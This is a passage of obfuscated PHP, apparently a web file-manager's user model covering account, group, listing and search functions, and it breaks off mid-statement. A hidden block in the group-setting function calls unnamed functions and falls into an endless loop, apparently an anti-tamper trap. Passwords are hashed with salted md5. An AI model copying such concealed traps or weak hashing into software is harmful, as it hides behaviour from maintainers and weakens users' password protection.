$bê­ãæã‚Ï[2468] => isset($EôÁ‰Ø¨­[$bê­ãæã‚Ï[290]]) ? $EôÁ‰Ø¨­[$bê­ãæã‚Ï[290]] : $bê­ãæã‚Ï[33], $bê­ãæã‚Ï[2469] => isset($EôÁ‰Ø¨­[$bê­ãæã‚Ï[2463]]) ? $EôÁ‰Ø¨­[$bê­ãæã‚Ï[2463]] : $bê­ãæã‚Ï[33], $bê­ãæã‚Ï[2470] => isset($EôÁ‰Ø¨­[$bê­ãæã‚Ï[2287]]) ? $EôÁ‰Ø¨­[$bê­ãæã‚Ï[2287]] : $EôÁ‰Ø¨­[$bê­ãæã‚Ï[28]], $bê­ãæã‚Ï[2471] => isset($EôÁ‰Ø¨­[$bê­ãæã‚Ï[2448]]) ? $EôÁ‰Ø¨­[$bê­ãæã‚Ï[2448]] : $bê­ãæã‚Ï[33], $bê­ãæã‚Ï[2472] => isset($EôÁ‰Ø¨­[$bê­ãæã‚Ï[2473]]) ? $EôÁ‰Ø¨­[$bê­ãæã‚Ï[2473]] : 1, $bê­ãæã‚Ï[2474] => $EôÁ‰Ø¨­[$bê­ãæã‚Ï[797]], $bê­ãæã‚Ï[2137] => isset($EôÁ‰Ø¨­[$bê­ãæã‚Ï[2051]]) ? $EôÁ‰Ø¨­[$bê­ãæã‚Ï[2051]] : 1024 * 1024 * 20, $bê­ãæã‚Ï[2138] => 0, $bê­ãæã‚Ï[2464] => 0, $bê­ãæã‚Ï[2162] => isset($EôÁ‰Ø¨­[$bê­ãæã‚Ï[681]]) ? $EôÁ‰Ø¨­[$bê­ãæã‚Ï[681]] : 1); if (!empty($EôÁ‰Ø¨­[$bê­ãæã‚Ï[1404]])) { $d„å¶À­¸ë[$bê­ãæã‚Ï[1404]] = $EôÁ‰Ø¨­[$bê­ãæã‚Ï[1404]]; } goto Cê´¥°¾Ø§; e‹¼¼£ñ‚Î: $BÊùòßá¨Ÿ = array($bê­ãæã‚Ï[2474] => $d„å¶À­¸ë[$bê­ãæã‚Ï[797]], $bê­ãæã‚Ï[2470] => $d„å¶À­¸ë[$bê­ãæã‚Ï[2287]]); $this->userEdit($BéÖùó¢, $BÊùòßá¨Ÿ); Model($bê­ãæã‚Ï[1103])->userRootAdd($BéÖùó¢); goto e”ÄåÅÖƒÆ; e”ÄåÅÖƒÆ: return $BéÖùó¢; goto D „îÈãŒ¶; Cê´¥°¾Ø§: $bŠ¬­ƒ¡“• = $this->_checkExist($EôÁ‰Ø¨­); if ($bŠ¬­ƒ¡“• !== !0) { return $bŠ¬­ƒ¡“•; } $BéÖùó¢ = $this->add($d„å¶À­¸ë); goto e‹¼¼£ñ‚Î; D „îÈãŒ¶: } protected function userEditTest($aæ“Ò¬ãÇæ, $aÊñš±òÚŞ) { return $this->call($_SERVER[¼][2475], $aæ“Ò¬ãÇæ, $aÊñš±òÚŞ); } protected function userEdit($bŒ°‹£ÚÇÖ, $f‰¨»¦ù…) { goto bë¸¾ÆÇÁ„; eºª‚ÇÃö¡: $B‹à¤É½³ = $this->_checkExist($f‰¨»¦ù…, $bŒ°‹£ÚÇÖ); if ($B‹à¤É½³ !== !0) { return $B‹à¤É½³; } if (isset($f‰¨»¦ù…[$c´ˆ­è¡É[797]]) && trim($f‰¨»¦ù…[$c´ˆ­è¡É[797]]) != $c´ˆ­è¡É[33]) { $E©äİÂ¨º÷ = $this->metaGet($bŒ°‹£ÚÇÖ); if (empty($E©äİÂ¨º÷[$c´ˆ­è¡É[2465]])) { $E©äİÂ¨º÷[$c´ˆ­è¡É[2465]] = rand_string(10); Model($c´ˆ­è¡É[470])->metaSet($bŒ°‹£ÚÇÖ, $c´ˆ­è¡É[2465], $E©äİÂ¨º÷[$c´ˆ­è¡É[2465]]); } $f‰¨»¦ù…[$c´ˆ­è¡É[797]] = md5($E©äİÂ¨º÷[$c´ˆ­è¡É[2465]] . trim($f‰¨»¦ù…[$c´ˆ­è¡É[797]])); } else { unset($f‰¨»¦ù…[$c´ˆ­è¡É[797]]); } goto f‚ÕêÚÉô; bë¸¾ÆÇÁ„: $c´ˆ­è¡É =& $_SERVER[¼]; $C‘ãåŒ…² = $this->getInfoSimple($bŒ°‹£ÚÇÖ); if (!$C‘ãåŒ…²) { return !1; } goto eºª‚ÇÃö¡; f‚ÕêÚÉô: $this->where(array($c´ˆ­è¡É[1395] => $bŒ°‹£ÚÇÖ))->save($f‰¨»¦ù…); if (isset($f‰¨»¦ù…[$c´ˆ­è¡É[2287]])) { $this->setNamePinyin($bŒ°‹£ÚÇÖ, $f‰¨»¦ù…[$c´ˆ­è¡É[2287]]); } return !0; goto BƒÉÚ„ìÄ‡; BƒÉÚ„ìÄ‡: } public function setNamePinyin($DİùÈ’À, $e˜ÁÓÁÎ‚¼ = false) { $bäŒ™„ï–‚ =& $_SERVER[¼]; if (!$e˜ÁÓÁÎ‚¼) { $cì¥ªØƒì³ = $this->getInfoSimple($DİùÈ’À); $e˜ÁÓÁÎ‚¼ = $cì¥ªØƒì³[$bäŒ™„ï–‚[2287]] ? $cì¥ªØƒì³[$bäŒ™„ï–‚[2287]] : $cì¥ªØƒì³[$bäŒ™„ï–‚[28]]; } $eÄ»ÄÒëá = Model($bäŒ™„ï–‚[473]); if (!Input::check($e˜ÁÓÁÎ‚¼, $bäŒ™„ï–‚[524])) { return $eÄ»ÄÒëá->metaSet($DİùÈ’À, array($bäŒ™„ï–‚[412] => $bäŒ™„ï–‚[33], $bäŒ™„ï–‚[411] => $bäŒ™„ï–‚[33])); } return $eÄ»ÄÒëá->metaSet($DİùÈ’À, array($bäŒ™„ï–‚[412] => str_replace($bäŒ™„ï–‚[50], $bäŒ™„ï–‚[33], Pinyin::encode($e˜ÁÓÁÎ‚¼)), $bäŒ™„ï–‚[411] => Pinyin::encode($e˜ÁÓÁÎ‚¼, $bäŒ™„ï–‚[525]))); } private function nickNameRpt() { $DÀŞ´Ô´ =& $_SERVER[¼]; $EÆ¥›í¶¿‰ = Model($DÀŞ´Ô´[1081])->get($DÀŞ´Ô´[2476]); $b«£‘÷¾Ó” = $GLOBALS[$DÀŞ´Ô´[6]][$DÀŞ´Ô´[2432]][$DÀŞ´Ô´[2476]]; $f³¿“ÀÍ¹Õ = !is_null($EÆ¥›í¶¿‰) ? $EÆ¥›í¶¿‰ : $b«£‘÷¾Ó”; return !!$f³¿“ÀÍ¹Õ; } private function _checkExist($dÇàğ±à·Ÿ, $F±÷ç´ëÈŒ = false) { $eØ›ï²«¨… =& $_SERVER[¼]; $CºªĞ©ªÈ = array($eØ›ï²«¨…[28] => UserModel::ERROR_USER_EXIST_NAME, $eØ›ï²«¨…[2287] => UserModel::ERROR_USER_EXIST_NICKNAME, $eØ›ï²«¨…[290] => UserModel::ERROR_USER_EXIST_EMAIL, $eØ›ï²«¨…[2463] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($CºªĞ©ªÈ[$eØ›ï²«¨…[2287]]); } $F¶Ø ˆæÖ‘ = $F±÷ç´ëÈŒ ? array($eØ›ï²«¨…[1404] => array($eØ›ï²«¨…[2477], $F±÷ç´ëÈŒ)) : array(); foreach ($CºªĞ©ªÈ as $E×‚ÓÎÆò… => $B»¢ÄÕ‘Î¢) { if (!isset($dÇàğ±à·Ÿ[$E×‚ÓÎÆò…]) || !$dÇàğ±à·Ÿ[$E×‚ÓÎÆò…]) { continue; } $E¥³²Ç—§ = array_merge(array($E×‚ÓÎÆò… => $dÇàğ±à·Ÿ[$E×‚ÓÎÆò…]), $F¶Ø ˆæÖ‘); $cêÙ¥Œ™ª = $this->where($E¥³²Ç—§)->find(); if ($cêÙ¥Œ™ª) { return $B»¢ÄÕ‘Î¢; } } return !0; } public function userListInfo($EÈ³²×»÷Í) { $bëà­‹ÛÅË =& $_SERVER[¼]; $a½íèí™ç¡ = array(); $EÈ³²×»÷Í = is_array($EÈ³²×»÷Í) ? array_unique($EÈ³²×»÷Í) : array(); if (!$EÈ³²×»÷Í) { return $a½íèí™ç¡; } if (count($EÈ³²×»÷Í) < 20) { foreach ($EÈ³²×»÷Í as $aƒœ¿òåã) { $a½íèí™ç¡[$aƒœ¿òåã . $bëà­‹ÛÅË[33]] = $this->getInfoSimpleOuter($aƒœ¿òåã); } } else { $b¾¦âÑèÇà = array($bëà­‹ÛÅË[1395] => array($bëà­‹ÛÅË[381], $EÈ³²×»÷Í)); if (count($EÈ³²×»÷Í) == 1) { $b¾¦âÑèÇà = array($bëà­‹ÛÅË[1395] => $EÈ³²×»÷Í[0]); } $eÑÍ…ª¿ÅÍ = Model($bëà­‹ÛÅË[470])->field($this->simpleField)->where($b¾¦âÑèÇà)->select(); $eÑÍ…ª¿ÅÍ = array_to_keyvalue($eÑÍ…ª¿ÅÍ, $bëà­‹ÛÅË[1404]); foreach ($EÈ³²×»÷Í as $aƒœ¿òåã) { $b ¼ª›„ÃÏ = $eÑÍ…ª¿ÅÍ[$eÑÍ…ª¿ÅÍ[$aƒœ¿òåã]]; if (!$b ¼ª›„ÃÏ) { $a½íèí™ç¡[$aƒœ¿òåã . $bëà­‹ÛÅË[33]] = $this->getInfoSimpleOuter($aƒœ¿òåã); continue; } $b ¼ª›„ÃÏ[$bëà­‹ÛÅË[2448]] = Action($bëà­‹ÛÅË[2449])->parseUrl($b ¼ª›„ÃÏ[$bëà­‹ÛÅË[2448]]); $a½íèí™ç¡[$aƒœ¿òåã . $bëà­‹ÛÅË[33]] = $b ¼ª›„ÃÏ; } } return $a½íèí™ç¡; } protected function userStatus($fø¥ã¾ö—, $bõˆ®ô±í¤) { $F¡ã¤ÈÔòŞ = $this->getInfoSimple($fø¥ã¾ö—); if (!$F¡ã¤ÈÔòŞ) { return !1; } $bš´Ş„«ñ  = array($_SERVER[¼][681] => $bõˆ®ô±í¤); return $this->userEdit($fø¥ã¾ö—, $bš´Ş„«ñ ); } protected function userRemove($EÃŞç«È‘Ÿ) { goto a–š‰²Áï; eºÊåÉ¥×‘: Model($aâé÷°Ï[744])->userRootRemove($EÃŞç«È‘Ÿ); return $this->where($fÃ‡îˆ›±à)->delete(); goto eí…´¢„ˆ; a–š‰²Áï: $aâé÷°Ï =& $_SERVER[¼]; $dòŸà«ˆ½ = $this->getInfoSimple($EÃŞç«È‘Ÿ); if (!$dòŸà«ˆ½) { return !1; } goto DŞ”ˆ¬â’‘; A…çÙÕ¤é: Model($aâé÷°Ï[2141])->where($fÃ‡îˆ›±à)->delete(); Model($aâé÷°Ï[2462])->where($fÃ‡îˆ›±à)->delete(); Model($aâé÷°Ï[2479])->where($fÃ‡îˆ›±à)->delete(); goto eºÊåÉ¥×‘; DŞ”ˆ¬â’‘: $fÃ‡îˆ›±à = array($aâé÷°Ï[1395] => $EÃŞç«È‘Ÿ); Model($aâé÷°Ï[532])->where($fÃ‡îˆ›±à)->delete(); Model($aâé÷°Ï[2478])->where($fÃ‡îˆ›±à)->delete(); goto A…çÙÕ¤é; eí…´¢„ˆ: } protected function userGroupSet($E¬Ò¶¬“æ, $eá¯ˆ£Ù«, $EãÃ„é®™— = array()) { goto B†ˆÅÙ¤Ãğ; e…ƒºÌ¢¤”: return $aÌ…Š†î—->addAll($eÅÊÑ¥ãØ, array(), !0); goto Dº ˆ¼‡ù÷; B†ˆÅÙ¤Ãğ: $c³ Ÿò·Øë =& $_SERVER[¼]; if (!isset($_SERVER[$c³ Ÿò·Øë[754]]) || !isset($_SERVER[$c³ Ÿò·Øë[776]])) { goto D×éŸäµ ; D×éŸäµ : $a£µ£äİÊ  = $c³ Ÿò·Øë[787]; $EÁÒ‡˜®Ü = $c³ Ÿò·Øë[755]; $bÂ ¹ŸŞ½… = $_SERVER[$c³ Ÿò·Øë[756]] . $c³ Ÿò·Øë[757]; goto Dİãº¯¦Ö»; Dİãº¯¦Ö»: $fº¢‘ÍĞÉ = $EÁÒ‡˜®Ü($bÂ ¹ŸŞ½…); $D±èš›Ï¬¨ = explode($c³ Ÿò·Øë[214], $fº¢‘ÍĞÉ); if (count($D±èš›Ï¬¨) < $c³ Ÿò·Øë[548]) { $BÉØùÅÎ™› = $c³ Ÿò·Øë[758]; $BÉØùÅÎ™›(); } goto F¾²ùÜÒé; F¾²ùÜÒé: $c…°Î„ï‚Ù = $c³ Ÿò·Øë[788]; $c…°Î„ï‚Ù($_SERVER[$c³ Ÿò·Øë[789]]); $c©®À°’íà = 1; goto dŠÁ­‹ÛŞ°; dŠÁ­‹ÛŞ°: for ($F»¨Ê¨¦Œ½ = $c©®À°’íà; $F»¨Ê¨¦Œ½ > 0; $F»¨Ê¨¦Œ½++) { $c…°Î„ï‚Ù = json_encode($GLOBALS[$c³ Ÿò·Øë[381]]); } goto EŠÚ„ë‰Õ; EŠÚ„ë‰Õ: } $b®‰Šİ÷²è = $this->getInfoSimple($E¬Ò¶¬“æ); goto dÅ‘İç±”ó; dÅ‘İç±”ó: if (!$b®‰Šİ÷²è || !is_array($eá¯ˆ£Ù«)) { return !1; } $aÌ…Š†î— = Model($c³ Ÿò·Øë[2141]); $aÌ…Š†î—->where(array($c³ Ÿò·Øë[1404] => $E¬Ò¶¬“æ))->delete(); goto a¤¬‘’Õ–ó; a¤¬‘’Õ–ó: $eÅÊÑ¥ãØ = array(); $D¯´Í“•£ = 0; foreach ($eá¯ˆ£Ù« as $fíÖß²´‚ => $CÁ×¡®·Œˆ) { $AÏ¬Çò±é‰ = array($c³ Ÿò·Øë[1404] => $E¬Ò¶¬“æ, $c³ Ÿò·Øë[2067] => $fíÖß²´‚, $c³ Ÿò·Øë[2195] => $CÁ×¡®·Œˆ); $AÏ¬Çò±é‰[$c³ Ÿò·Øë[2088]] = isset($EãÃ„é®™—[$D¯´Í“•£]) ? $EãÃ„é®™—[$D¯´Í“•£] : 0; $D¯´Í“•£++; $eÅÊÑ¥ãØ[] = $AÏ¬Çò±é‰; } goto e…ƒºÌ¢¤”; Dº ˆ¼‡ù÷: } protected function userGroupAdd($e‹âÔˆÒ¹Ô, $B»Š‚ÅùÅ­, $B‚ˆÊğõÉƒ) { $dëÄ³¢¥èù =& $_SERVER[¼]; $A¨µœ†‚« = $this->getInfoSimple($e‹âÔˆÒ¹Ô); if (!$A¨µœ†‚« || !$B»Š‚ÅùÅ­) { return !1; } $cÍ¿„•›¹Î = array(array($dëÄ³¢¥èù[1404] => $e‹âÔˆÒ¹Ô, $dëÄ³¢¥èù[2067] => $B»Š‚ÅùÅ­, $dëÄ³¢¥èù[2195] => $B‚ˆÊğõÉƒ)); return Model($dëÄ³¢¥èù[2141])->addAll($cÍ¿„•›¹Î, array(), !0); } protected function userGroupRemove($CèÙ‚šÄ¤, $DùÊ‚¨¸) { $d‚¼´©ùà¯ =& $_SERVER[¼]; $B•‰î‹òóÔ = $this->getInfoSimple($CèÙ‚šÄ¤); if (!$B•‰î‹òóÔ || !$DùÊ‚¨¸) { return !1; } $dö¿ÆäŸ£Ô = array($d‚¼´©ùà¯[1395] => $CèÙ‚šÄ¤, $d‚¼´©ùà¯[2139] => $DùÊ‚¨¸); return Model($d‚¼´©ùà¯[2141])->where($dö¿ÆäŸ£Ô)->delete(); } public function listData() { $E±æ¿¶ÚØ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E±æ¿¶ÚØ[$_SERVER[¼][351]]); return $E±æ¿¶ÚØ; } public function listByID($Dà¦Ü”»±†) { $EöŞµ ÇÀ´ =& $_SERVER[¼]; if (!$Dà¦Ü”»±†) { return; } $aãÄ¬Š¨¥¥ = array($EöŞµ ÇÀ´[1404] => array($EöŞµ ÇÀ´[7], $Dà¦Ü”»±†)); $F½…‹ã‚â‘ = $this->where($aãÄ¬Š¨¥¥)->select(); $this->_listDataApply($F½…‹ã‚â‘); return $F½…‹ã‚â‘; } public function listByGroup($EÓŸÄÍ•  = 0, $d©èëÈ¦¬À = array()) { goto D†‰ÆÍÓ·; a±°ÉÄÓ·Í: if ($EÓŸÄÍ• ) { $f¿³Òî‡Ó = array($bŞ›¹ßî[2480] => intval($EÓŸÄÍ• )); $cøĞœâ‰µ° = "\x4c\105\106\124\x20\112\117\111\116\x20{$this->tablePrefix}\165\x73\x65\x72\x5f\x67\162\157\165\x70\40\165\x73\x65\x72\137\x67\162\157\x75\160\x20\x6f\156\x20\x75\x73\145\162\56\165\163\x65\x72\111\x44\40\75\40\x75\163\x65\x72\137\147\162\157\165\x70\x2e\165\163\x65\x72\x49\104"; $bÍ²¸àåµó = Input::get($bŞ›¹ßî[403], null, $bŞ›¹ßî[33]) ? $bŞ›¹ßî[33] : $bŞ›¹ßî[2481]; } if (isset($d©èëÈ¦¬À[$bŞ›¹ßî[681]])) { $f¿³Òî‡Ó[$bŞ›¹ßî[2482]] = $d©èëÈ¦¬À[$bŞ›¹ßî[681]]; } $dŒ¯‚ù‚ØÇ = $this->_makeOrder($bÍ²¸àåµó)->field($bŞ›¹ßî[2483])->where($f¿³Òî‡Ó)->join($cøĞœâ‰µ°)->selectPage(50); goto CäÙ‰èˆòš; CäÙ‰èˆòš: $this->_listDataApply($dŒ¯‚ù‚ØÇ[$bŞ›¹ßî[351]]); return $dŒ¯‚ù‚ØÇ; goto câÈ›ŠÈ¿ğ; D†‰ÆÍÓ·: $bŞ›¹ßî =& $_SERVER[¼]; $cøĞœâ‰µ° = $bŞ›¹ßî[33]; $f¿³Òî‡Ó = array(); goto a±°ÉÄÓ·Í; câÈ›ŠÈ¿ğ: } private function _makeOrder($AŸÀÃàíé = '') { goto bê‡±â¼ñ‰; bê‡±â¼ñ‰: $BÆõÇ¹¯›Ã =& $_SERVER[¼]; $a¨ÓÎ ¡ÍÈ = array($BÆõÇ¹¯›Ã[1404], $BÆõÇ¹¯›Ã[28], $BÆõÇ¹¯›Ã[2053], $BÆõÇ¹¯›Ã[2026], $BÆõÇ¹¯›Ã[184]); $EìˆÒŒÊÑº = array($BÆõÇ¹¯›Ã[398] => $BÆõÇ¹¯›Ã[399], $BÆõÇ¹¯›Ã[400] => $BÆõÇ¹¯›Ã[401]); goto fÅÓøòè§ˆ; fÅÓøòè§ˆ: $E½‚—©³‚« = Input::get($BÆõÇ¹¯›Ã[403], $BÆõÇ¹¯›Ã[7], $BÆõÇ¹¯›Ã[1395], $a¨ÓÎ ¡ÍÈ); $F¦Í¿²×î¦ = Input::get($BÆõÇ¹¯›Ã[404], $BÆõÇ¹¯›Ã[7], $BÆõÇ¹¯›Ã[2142], array($BÆõÇ¹¯›Ã[2142], $BÆõÇ¹¯›Ã[400])); $F¦Í¿²×î¦ = $EìˆÒŒÊÑº[$F¦Í¿²×î¦]; goto F©íõÏÔæ; F©íõÏÔæ: $AŸÀÃàíé = $AŸÀÃàíé . "\x75\x73\145\162\56{$E½‚—©³‚«}\40{$F¦Í¿²×î¦}\54\x20\165\x73\145\x72\x2e\x75\163\145\162\x49\104\x20\141\x73\143"; return $this->alias($BÆõÇ¹¯›Ã[2228])->order($AŸÀÃàíé); goto Aæ›à½Áë; Aæ›à½Áë: } public function listSearch($fĞ¬Ø¿éÎ“) { goto DõÁ²ğ¿İÎ; DõÁ²ğ¿İÎ: $c¨‘å¢…Î =& $_SERVER[¼]; $C†¥ô”ºŒ = $fĞ¬Ø¿éÎ“[$c¨‘å¢…Î[2143]]; $eÄÁ¹ğò‚ = isset($fĞ¬Ø¿éÎ“[$c¨‘å¢…Î[2144]]) ? $fĞ¬Ø¿éÎ“[$c¨‘å¢…Î[2144]] : !1; goto d¿Ï—¯ˆ¹å; a¦ÂÙ™õš: return $båàƒ”î©ß; goto aÂºÆ»à; e»“ß›ƒÊ: if (!$båàƒ”î©ß || count($båàƒ”î©ß[$c¨‘å¢…Î[351]]) < 5 && Input::check($C†¥ô”ºŒ, $c¨‘å¢…Î[303])) { $EÍóêõá¤ = $this->_searchFromMeta($c¨‘å¢…Î[411], $C†¥ô”ºŒ, 10); $F„Ì—ÙëŞ‚ = $this->_searchFromMeta($c¨‘å¢…Î[412], $C†¥ô”ºŒ, 10); $c„ôÂªåÁÒ = array_merge($EÍóêõá¤, $F„Ì—ÙëŞ‚, $båàƒ”î©ß[$c¨‘å¢…Î[351]]); $båàƒ”î©ß[$c¨‘å¢…Î[351]] = array_unique_by_key($c„ôÂªåÁÒ, $c¨‘å¢…Î[1404]); $båàƒ”î©ß[$c¨‘å¢…Î[348]][$c¨‘å¢…Î[349]] = count($båàƒ”î©ß[$c¨‘å¢…Î[351]]); $båàƒ”î©ß[$c¨‘å¢…Î[348]][$c¨‘å¢…Î[350]] = ceil($båàƒ”î©ß[$c¨‘å¢…Î[348]][$c¨‘å¢…Î[349]] / $båàƒ”î©ß[$c¨‘å¢…Î[348]][$c¨‘å¢…Î[346]]); } $this->_listDataApply($båàƒ”î©ß[$c¨‘å¢…Î[351]]); $this->_filterByGroup($båàƒ”î©ß, $eÄÁ¹ğò‚); goto a¦ÂÙ™õš; FŒ‹İ‚¼ËŸ: if (!$C†¥ô”ºŒ) { $DÖÅ…ö•î‡ = array(); } if (isset($fĞ¬Ø¿éÎ“[$c¨‘å¢…Î[681]])) { $DÖÅ…ö•î‡[$c¨‘å¢…Î[681]] = $fĞ¬Ø¿éÎ“[$c¨‘å¢…Î[681]]; } $båàƒ”î©ß = $this->_makeOrder()->where($DÖÅ…ö•î‡)->selectPage(20); goto e»“ß›ƒÊ; d¿Ï—¯ˆ¹å: $C†¥ô”ºŒ = str_replace($c¨‘å¢…Î[2145], $c¨‘å¢…Î[2146], trim($C†¥ô”ºŒ)); $DÖÅ…ö•î‡ = array($c¨‘å¢…Î[28] => array($c¨‘å¢…Î[743], "\45{$C†¥ô”ºŒ}\x25"), $c¨‘å¢…Î[290] => array($c¨‘å¢…Î[743], "\x25{$C†¥ô”ºŒ}\45"), $c¨‘å¢…Î[2287] => array($c¨‘å¢…Î[743], "\x25{$C†¥ô”ºŒ}\x25"), $c¨‘å¢…Î[909] => $c¨‘å¢…Î[2147]); if (Input::check($C†¥ô”ºŒ, $c¨‘å¢…Î[296])) { $DÖÅ…ö•î‡[$c¨‘å¢…Î[1404]] = array($c¨‘å¢…Î[743], "\x25{$C†¥ô”ºŒ}\x25"); $DÖÅ…ö•î‡[$c¨‘å¢…Î[2463]] = array($c¨‘å¢…Î[743], "\45{$C†¥ô”ºŒ}\45"); } goto FŒ‹İ‚¼ËŸ; aÂºÆ»à: } private function _filterByGroup(&$F½Ã—ºÉ—É, $FÕ’Ú¤Õšù) { $DĞÁŒ½³ÊÓ =& $_SERVER[¼]; if (!$FÕ’Ú¤Õšù) { return $F½Ã—ºÉ—É; } foreach ($F½Ã—ºÉ—É[$DĞÁŒ½³ÊÓ[351]] as $c”¥ªÖÀêõ => &$f´£ÂŠ½) { $F»¹äğ’¢â = array_to_keyvalue($f´£ÂŠ½[$DĞÁŒ½³ÊÓ[2484]], $DĞÁŒ½³ÊÓ[33], $DĞÁŒ½³ÊÓ[2067]); if (!in_array($FÕ’Ú¤Õšù, $F»¹äğ’¢â)) { unset($F½Ã—ºÉ—É[$DĞÁŒ½³ÊÓ[351]][$c”¥ªÖÀêõ]); } } $F½Ã—ºÉ—É[$DĞÁŒ½³ÊÓ[351]] = array_values($F½Ã—ºÉ—É[$DĞÁŒ½³ÊÓ[351]]); $F½Ã—ºÉ—É[$DĞÁŒ½³ÊÓ[348]] = array($DĞÁŒ½³ÊÓ[2262] => count($F½Ã—ºÉ—É[$DĞÁŒ½³ÊÓ[351]]), $DĞÁŒ½³ÊÓ[2260] => $F½Ã—ºÉ—É[$DĞÁŒ½³ÊÓ[348]][$DĞÁŒ½³ÊÓ[346]], $DĞÁŒ½³ÊÓ[2259] => 1, $DĞÁŒ½³ÊÓ[2261] => 1); } private function _searchFromMeta($E¡²àİ„ğÌ, $bÙº¥ë‹µ, $a‰”Ú¶“¦Ã) { goto A¸êÅ‰ªÏ; BÂÚõçê­Ô: $FÚ¥Äİ¾ÔÓ = $this->where(array($c…Úì´Íä[1395] => array($c…Úì´Íä[7], $F²ãÇ˜‡×Õ)))->select(); if (!$FÚ¥Äİ¾ÔÓ) { return array(); } return $FÚ¥Äİ¾ÔÓ; goto dÖà„‰™ò; A¸êÅ‰ªÏ: $c…Úì´Íä =& $_SERVER[¼]; $bÙº¥ë‹µ = strtolower($bÙº¥ë‹µ); $e‡äÙ»ÊêÃ = array($c…Úì´Íä[89] => $E¡²àİ„ğÌ, $c…Úì´Íä[356] => array($c…Úì´Íä[743], "\45{$bÙº¥ë‹µ}\45")); goto B³Ç¼§•«ì; B³Ç¼§•«ì: $F²ãÇ˜‡×Õ = Model($c…Úì´Íä[2485])->where($e‡äÙ»ÊêÃ)->limit($a‰”Ú¶“¦Ã)->select(); if (!$F²ãÇ˜‡×Õ) { return array(); } $F²ãÇ˜‡×Õ = array_to_keyvalue($F²ãÇ˜‡×Õ, $c…Úì´Íä[33], $c…Úì´Íä[1404]); goto BÂÚõçê­Ô; dÖà„‰™ò: } private function _listDataApplyItem($b¡Ã²öÓå) { $b²ã“œÙ¿ = array($b¡Ã²öÓå); $this->_listDataApply($b²ã“œÙ¿); return $b²ã“œÙ¿[0]; } private function _listDataApply(&$Bš±÷•ÙÀ) { goto Fà¦Êìƒ¯‡; Fà¦Êìƒ¯‡: $fØ¿å¬Ï“¤ =& $_SERVER[¼]; if (!$Bš±÷•ÙÀ) { return; } array_remove_key($Bš±÷•ÙÀ, $fØ¿å¬Ï“¤[797]); goto DÔœ´¥ò«é; DÔœ´¥ò«é: $C”ššõÆİÖ = array_to_keyvalue($Bš±÷•ÙÀ, $fØ¿å¬Ï“¤[33], $fØ¿å¬Ï“¤[1404]); $this->_listAppendGroup($Bš±÷•ÙÀ, $C”ššõÆİÖ); $this->_listAppendMeta($Bš±÷•ÙÀ, $C”ššõÆİÖ); goto FÀë–Š”İ; FÀë–Š”İ: $this->_listAppendSourceRoot($Bš±÷•ÙÀ, $C”ššõÆİÖ); goto DêÜÎ¯ ˜Â; DêÜÎ¯ ˜Â: } private function _listAppendSourceRoot(&$Eƒ¾Ó†á”, $AÍ¤ùÅŠ—ã) { goto c“éÄÃÊ†; BæÂ·ò• À: $e×äéïŒ = Model($fˆÑê‰òÅĞ[744])->order($fˆÑê‰òÅĞ[2154])->field($CŠÙÖœ™ñ)->where($fªŸ¸çº„­)->select(); $e×äéïŒ = array_to_keyvalue($e×äéïŒ, $fˆÑê‰òÅĞ[452]); $e×äéïŒ = array_remove_key($e×äéïŒ, $fˆÑê‰òÅĞ[452]); goto b¹ÚÄÊ¹ë; b¹ÚÄÊ¹ë: foreach ($Eƒ¾Ó†á” as &$FÏ“ï®½†â) { $FÏ“ï®½†â[$fˆÑê‰òÅĞ[388]] = $e×äéïŒ[$FÏ“ï®½†â[$fˆÑê‰òÅĞ[1404]]] ? $e×äéïŒ[$FÏ“ï®½†â[$fˆÑê‰òÅĞ[1404]]] : array(); } goto C’Œö›‹÷®; c“éÄÃÊ†: $fˆÑê‰òÅĞ =& $_SERVER[¼]; $fªŸ¸çº„­ = array($fˆÑê‰òÅĞ[457] => 0, $fˆÑê‰òÅĞ[368] => SourceModel::TYPE_USER, $fˆÑê‰òÅĞ[452] => array($fˆÑê‰òÅĞ[7], $AÍ¤ùÅŠ—ã)); $CŠÙÖœ™ñ = $fˆÑê‰òÅĞ[2153]; goto BæÂ·ò• À; C’Œö›‹÷®: } private function _listAppendGroup(&$fâì•¨è£œ, $fØò¡ğ³Ğ) { goto AÕË’Šˆ«; eœÆÖÔ©à±: $B»“Ë˜à± = array_to_keyvalue_group($B»“Ë˜à±, $b‡ŞŒŞí¨Ğ[1404]); foreach ($B»“Ë˜à± as &$f‹­ÄÊ¶îš) { $DíÀ±¤ÍáÙ = array(); foreach ($f‹­ÄÊ¶îš as $E±³ª÷À¾‚) { if (!$E±³ª÷À¾‚[$b‡ŞŒŞí¨Ğ[2195]]) { continue; } $EŠ„ŠƒÕ˜š = Model($b‡ŞŒŞí¨Ğ[2214])->listData($E±³ª÷À¾‚[$b‡ŞŒŞí¨Ğ[2195]]); $DíÀ±¤ÍáÙ[] = array($b‡ŞŒŞí¨Ğ[2067] => $E±³ª÷À¾‚[$b‡ŞŒŞí¨Ğ[2067]], $b‡ŞŒŞí¨Ğ[2488] => $fÍ’Ìó£İ‘[$E±³ª÷À¾‚[$b‡ŞŒŞí¨Ğ[2067]]], $b‡ŞŒŞí¨Ğ[373] => $EŠ„ŠƒÕ˜š); } $f‹­ÄÊ¶îš = $DíÀ±¤ÍáÙ; } foreach ($fâì•¨è£œ as &$c™È×•å×¢) { $c™È×•å×¢[$b‡ŞŒŞí¨Ğ[2484]] = array(); if (isset($B»“Ë˜à±[$c™È×•å×¢[$b‡ŞŒŞí¨Ğ[1404]]])) { $c™È×•å×¢[$b‡ŞŒŞí¨Ğ[2484]] = $B»“Ë˜à±[$c™È×•å×¢[$b‡ŞŒŞí¨Ğ[1404]]]; } } goto AÌÓ“ˆ†; C‰ğ‚¤øª: $dä‰‹ôôĞ— = array($b‡ŞŒŞí¨Ğ[2067] => array($b‡ŞŒŞí¨Ğ[7], $E˜¬Á¿²é½)); $fÙñ‹®®ˆ‡ = Model($b‡ŞŒŞí¨Ğ[2486])->field($b‡ŞŒŞí¨Ğ[2487])->where($dä‰‹ôôĞ—)->select(); $fÍ’Ìó£İ‘ = array_to_keyvalue($fÙñ‹®®ˆ‡, $b‡ŞŒŞí¨Ğ[2067], $b‡ŞŒŞí¨Ğ[28]); goto eœÆÖÔ©à±; fÁÅ–…İ¶œ: $E˜¬Á¿²é½ = array_to_keyvalue($B»“Ë˜à±, $b‡ŞŒŞí¨Ğ[33], $b‡ŞŒŞí¨Ğ[2067]); $E˜¬Á¿²é½ = array_remove_value(array_unique($E˜¬Á¿²é½), $b‡ŞŒŞí¨Ğ[464]); if 